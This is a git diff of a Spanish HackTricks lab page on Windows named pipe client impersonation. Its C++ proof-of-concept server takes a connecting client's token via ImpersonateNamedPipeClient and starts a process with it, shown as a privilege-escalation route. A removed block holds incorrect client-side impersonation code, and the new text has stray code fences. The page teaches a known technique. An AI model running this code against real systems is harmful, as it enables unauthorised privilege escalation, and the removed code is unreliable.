@@ -1,31 +1,35 @@
-## Impersonación de cliente de tubería con nombre
+# Impersonación del Cliente de Named Pipe
+
+## Impersonación del Cliente de Named Pipe
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Consigue el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+Otras formas de apoyar a HackTricks:
+
+* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 **Esta información fue copiada de** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
 
-## Descripción general
+## Visión General
 
-Una `tubería` es un bloque de memoria compartida que los procesos pueden usar para comunicarse e intercambiar datos.
+Un `pipe` es un bloque de memoria compartida que los procesos pueden usar para comunicarse e intercambiar datos.
 
-Las `tuberías con nombre` son un mecanismo de Windows que permite que dos procesos no relacionados intercambien datos entre sí, incluso si los procesos se encuentran en dos redes diferentes. Es muy similar a la arquitectura cliente/servidor, ya que existen nociones como `un servidor de tubería con nombre` y un `cliente de tubería con nombre`.
+`Named Pipes` es un mecanismo de Windows que permite a dos procesos no relacionados intercambiar datos entre sí, incluso si los procesos se encuentran en dos redes diferentes. Es muy similar a la arquitectura cliente/servidor ya que existen conceptos como `un servidor de named pipe` y un `cliente de named pipe`.
 
-Un servidor de tubería con nombre puede abrir una tubería con nombre con un nombre predefinido y luego un cliente de tubería con nombre puede conectarse a esa tubería a través del nombre conocido. Una vez establecida la conexión, puede comenzar el intercambio de datos.
+Un servidor de named pipe puede abrir un named pipe con algún nombre predefinido y luego un cliente de named pipe puede conectarse a ese pipe mediante el nombre conocido. Una vez que se establece la conexión, puede comenzar el intercambio de datos.
 
-Este laboratorio se refiere a un código PoC simple que permite:
+Este laboratorio se ocupa de un código PoC simple que permite:
 
-* crear un servidor de tubería con nombre tonto de un solo subproceso que aceptará una conexión de cliente
-* que el servidor de tubería con nombre escriba un mensaje simple en la tubería con nombre para que el cliente de la tubería pueda leerlo
+* crear un servidor de named pipe tonto de un solo hilo que aceptará una conexión de cliente
+* servidor de named pipe para escribir un mensaje simple en el named pipe para que el cliente de pipe pueda leerlo
 
 ## Código
 
@@ -39,187 +43,37 @@ A continuación se muestra el PoC tanto para el servidor como para el cliente:
 #include <iostream>
 
 int main() {
-	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
-	LPVOID pipeBuffer = NULL;
-	HANDLE serverPipe;
-	DWORD readBytes = 0;
-	DWORD readBuffer = 0;
-	int err = 0;
-	BOOL isPipeConnected;
-	BOOL isPipeOpen;
-	wchar_t message[] = L"HELL";
-	DWORD messageLenght = lstrlen(message) * 2;
-	DWORD bytesWritten = 0;
+LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
+LPVOID pipeBuffer = NULL;
+HANDLE serverPipe;
+DWORD readBytes = 0;
+DWORD readBuffer = 0;
+int err = 0;
+BOOL isPipeConnected;
+BOOL isPipeOpen;
+wchar_t message[] = L"HELL";
+DWORD messageLenght = lstrlen(message) * 2;
+DWORD bytesWritten = 0;
 
-	std::wcout << "Creating named pipe " << pipeName << std::endl;
-	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
-	
-	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
-	if (isPipeConnected) {
-		std::wcout << "Incoming connection to " << pipeName << std::endl;
-	}
-	
-	std::wcout << "Sending message: " << message << std::endl;
-	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
-	
-	return 0;
+std::wcout << "Creating named pipe " << pipeName << std::endl;
+serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
+
+isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
+if (isPipeConnected) {
+std::wcout << "Incoming connection to " << pipeName << std::endl;
+}
+
+std::wcout << "Sending message: " << message << std::endl;
+WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
+
+return 0;
 }
 ```
+```markdown
 {% endtab %}
 
 {% tab title="namedPipeClient.cpp" %}
-
-# Named Pipe Client Impersonation
-
-Este código muestra cómo un cliente puede conectarse a un servidor de tuberías con nombre y luego usar la función `ImpersonateNamedPipeClient` para obtener el token de seguridad del cliente y ejecutar un comando con los permisos del cliente.
-
-```cpp
-#include <windows.h>
-#include <stdio.h>
-#include <tchar.h>
-
-#define BUFSIZE 512
-
-int _tmain(int argc, TCHAR *argv[])
-{
-   HANDLE hPipe;
-   LPTSTR lpvMessage=TEXT("Default message from client.");
-   TCHAR chBuf[BUFSIZE];
-   BOOL fSuccess = FALSE;
-   DWORD cbRead, cbToWrite, cbWritten, dwMode;
-   LPTSTR lpszPipename = TEXT("\\\\.\\pipe\\mynamedpipe");
-
-   if( argc > 1 )
-      lpvMessage = argv[1];
-
-// Try to open a named pipe; wait for it, if necessary.
-
-   while (1)
-   {
-      hPipe = CreateFile(
-         lpszPipename,   // pipe name
-         GENERIC_READ |  // read and write access
-         GENERIC_WRITE,
-         0,              // no sharing
-         NULL,           // default security attributes
-         OPEN_EXISTING,  // opens existing pipe
-         0,              // default attributes
-         NULL);          // no template file
-
-   // Break if the pipe handle is valid.
-
-      if (hPipe != INVALID_HANDLE_VALUE)
-         break;
-
-      // Exit if an error other than ERROR_PIPE_BUSY occurs.
-
-      if (GetLastError() != ERROR_PIPE_BUSY)
-      {
-         _tprintf( TEXT("Could not open pipe. GLE=%d\n"), GetLastError() );
-         return -1;
-      }
-
-      // All pipe instances are busy, so wait for 20 seconds.
-
-      if ( ! WaitNamedPipe(lpszPipename, 20000))
-      {
-         printf("Could not open pipe: 20 second wait timed out.");
-         return -1;
-      }
-   }
-
-// The pipe connected; change to message-read mode.
-
-   dwMode = PIPE_READMODE_MESSAGE;
-   fSuccess = SetNamedPipeHandleState(
-      hPipe,    // pipe handle
-      &dwMode,  // new pipe mode
-      NULL,     // don't set maximum bytes
-      NULL);    // don't set maximum time
-
-   if ( ! fSuccess)
-   {
-      _tprintf( TEXT("SetNamedPipeHandleState failed. GLE=%d\n"), GetLastError() );
-      return -1;
-   }
-
-// Send a message to the pipe server.
-
-   cbToWrite = (lstrlen(lpvMessage)+1)*sizeof(TCHAR);
-   _tprintf( TEXT("Sending %d byte message: \"%s\"\n"), cbToWrite, lpvMessage);
-
-   fSuccess = WriteFile(
-      hPipe,                  // pipe handle
-      lpvMessage,             // message
-      cbToWrite,              // message length
-      &cbWritten,             // bytes written
-      NULL);                  // not overlapped
-
-   if ( ! fSuccess)
-   {
-      _tprintf( TEXT("WriteFile to pipe failed. GLE=%d\n"), GetLastError() );
-      return -1;
-   }
-
-   printf("\nMessage sent to server, receiving reply as follows:\n");
-
-   do
-   {
-   // Read from the pipe.
-
-      fSuccess = ReadFile(
-         hPipe,    // pipe handle
-         chBuf,    // buffer to receive reply
-         BUFSIZE*sizeof(TCHAR),  // size of buffer
-         &cbRead,  // number of bytes read
-         NULL);    // not overlapped
-
-      if ( ! fSuccess && GetLastError() != ERROR_MORE_DATA )
-         break;
-
-      _tprintf( TEXT("\"%s\"\n"), chBuf );
-   } while ( ! fSuccess);  // repeat loop if ERROR_MORE_DATA
-
-   if ( ! fSuccess)
-   {
-      _tprintf( TEXT("ReadFile from pipe failed. GLE=%d\n"), GetLastError() );
-      return -1;
-   }
-
-   printf("\n<End of message, press ENTER to terminate connection and exit>");
-   _getch();
-
-// Impersonate the named pipe client.
-
-   if (!ImpersonateNamedPipeClient(hPipe))
-   {
-      _tprintf( TEXT("ImpersonateNamedPipeClient failed. GLE=%d\n"), GetLastError() );
-      return -1;
-   }
-
-// Execute a command as the named pipe client.
-
-   if (!CreateProcessAsUser(NULL, _T("C:\\Windows\\System32\\cmd.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, NULL, NULL))
-   {
-      _tprintf( TEXT("CreateProcessAsUser failed. GLE=%d\n"), GetLastError() );
-      return -1;
-   }
-
-// Stop impersonating the named pipe client.
-
-   if (!RevertToSelf())
-   {
-      _tprintf( TEXT("RevertToSelf failed. GLE=%d\n"), GetLastError() );
-      return -1;
-   }
-
-   CloseHandle(hPipe);
-
-   return 0;
-}
 ```
-
-</details>
 ```cpp
 #include "pch.h"
 #include <iostream>
@@ -229,21 +83,21 @@ const int MESSAGE_SIZE = 512;
 
 int main()
 {
-	LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
-	HANDLE clientPipe = NULL;
-	BOOL isPipeRead = true;
-	wchar_t message[MESSAGE_SIZE] = { 0 };
-	DWORD bytesRead = 0;
+LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
+HANDLE clientPipe = NULL;
+BOOL isPipeRead = true;
+wchar_t message[MESSAGE_SIZE] = { 0 };
+DWORD bytesRead = 0;
 
-	std::wcout << "Connecting to " << pipeName << std::endl;
-	clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-	
-	while (isPipeRead) {
-		isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
-		std::wcout << "Received message: " << message;
-	}
+std::wcout << "Connecting to " << pipeName << std::endl;
+clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 
-	return 0;
+while (isPipeRead) {
+isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
+std::wcout << "Received message: " << message;
+}
+
+return 0;
 }
 ```
 {% endtab %}
@@ -251,73 +105,87 @@ int main()
 
 ## Ejecución
 
-A continuación se muestra el servidor de named pipe y el cliente de named pipe funcionando como se esperaba:
+A continuación se muestra el servidor de tubería con nombre y el cliente de tubería con nombre funcionando como se espera:
 
 ![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)
 
-Vale la pena señalar que la comunicación de named pipes por defecto utiliza el protocolo SMB:
+Vale la pena mencionar que la comunicación de tuberías con nombre por defecto utiliza el protocolo SMB:
 
 ![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)
 
-Comprobando cómo el proceso mantiene un identificador para nuestro named pipe `mantvydas-first-pipe`:
+Comprobando cómo el proceso mantiene un handle a nuestra tubería con nombre `mantvydas-first-pipe`:
 
 ![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)
 
-De manera similar, podemos ver que el cliente tiene un identificador abierto para el named pipe:
+De manera similar, podemos ver al cliente teniendo un handle abierto a la tubería con nombre:
 
 ![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)
 
-Incluso podemos ver nuestro pipe con powershell:
+Incluso podemos ver nuestra tubería con powershell:
 ```csharp
 ((Get-ChildItem \\.\pipe\).name)[-1..-5]
 ```
-![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (3).png>)
-
-## Impersonación de Token
+```markdown
+## Suplantación de Token
 
 {% hint style="info" %}
-Tenga en cuenta que para suplantar el token del proceso del cliente, es necesario que el proceso del servidor que crea la tubería tenga el privilegio de token **`SeImpersonate`**
+Ten en cuenta que para suplantar el token del proceso cliente necesitas tener (el proceso servidor que crea el pipe) el privilegio de token **`SeImpersonate`**.
 {% endhint %}
 
-Es posible que el servidor de la tubería con nombre suplante el contexto de seguridad del cliente de la tubería con nombre aprovechando una llamada de API `ImpersonateNamedPipeClient`, que a su vez cambia el token del subproceso actual del servidor de la tubería con nombre con el token del cliente de la tubería con nombre.
+Es posible que el servidor de named pipe suplante el contexto de seguridad del cliente de named pipe aprovechando una llamada a la API `ImpersonateNamedPipeClient` que a su vez cambia el token del hilo actual del servidor de named pipe por el del token del cliente de named pipe.
 
-Podemos actualizar el código del servidor de la tubería con nombre de esta manera para lograr la suplantación - tenga en cuenta que las modificaciones se ven en la línea 25 y siguientes:
+Podemos actualizar el código del servidor de named pipe de esta manera para lograr la suplantación - observa que las modificaciones se ven en la línea 25 y siguientes:
+```
 ```cpp
 int main() {
-	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
-	LPVOID pipeBuffer = NULL;
-	HANDLE serverPipe;
-	DWORD readBytes = 0;
-	DWORD readBuffer = 0;
-	int err = 0;
-	BOOL isPipeConnected;
-	BOOL isPipeOpen;
-	wchar_t message[] = L"HELL";
-	DWORD messageLenght = lstrlen(message) * 2;
-	DWORD bytesWritten = 0;
+LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
+LPVOID pipeBuffer = NULL;
+HANDLE serverPipe;
+DWORD readBytes = 0;
+DWORD readBuffer = 0;
+int err = 0;
+BOOL isPipeConnected;
+BOOL isPipeOpen;
+wchar_t message[] = L"HELL";
+DWORD messageLenght = lstrlen(message) * 2;
+DWORD bytesWritten = 0;
 
-	std::wcout << "Creating named pipe " << pipeName << std::endl;
-	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
-	
-	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
-	if (isPipeConnected) {
-		std::wcout << "Incoming connection to " << pipeName << std::endl;
-	}
-	
-	std::wcout << "Sending message: " << message << std::endl;
-	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
-	
-	std::wcout << "Impersonating the client..." << std::endl;
-	ImpersonateNamedPipeClient(serverPipe);
-	err = GetLastError();	
+std::wcout << "Creating named pipe " << pipeName << std::endl;
+serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
 
-	STARTUPINFO	si = {};
-	wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
-	PROCESS_INFORMATION pi = {};
-	HANDLE threadToken = GetCurrentThreadToken();
-	CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
+if (isPipeConnected) {
+std::wcout << "Incoming connection to " << pipeName << std::endl;
+}
 
-	return 0;
+std::wcout << "Sending message: " << message << std::endl;
+WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
+
+std::wcout << "Impersonating the client..." << std::endl;
+ImpersonateNamedPipeClient(serverPipe);
+err = GetLastError();
+
+STARTUPINFO	si = {};
+wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
+PROCESS_INFORMATION pi = {};
+HANDLE threadToken = GetCurrentThreadToken();
+CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+return 0;
 }
 ```
-Al ejecutar el servidor y conectarse a él con el cliente que se está ejecutando bajo el contexto de seguridad de administrador@offense.local, podemos ver que el hilo principal del named server pipe asumió el token del cliente de named pipe - offense\administrator, aunque el PipeServer.exe en sí se está ejecutando bajo el contexto de seguridad de ws01\mantvydas. ¿Suena como una buena manera de escalar privilegios?
+Ejecutando el servidor y conectándonos a él con el cliente que se ejecuta bajo el contexto de seguridad de administrator@offense.local, podemos ver que el hilo principal del servidor de tubería con nombre asumió el token del cliente de tubería con nombre - offense\administrator, aunque el PipeServer.exe en sí se está ejecutando bajo el contexto de seguridad de ws01\mantvydas. ¿Suena como una buena manera de escalar privilegios?
+
+<details>
+
+<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+Otras maneras de apoyar a HackTricks:
+
+* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+
+</details>
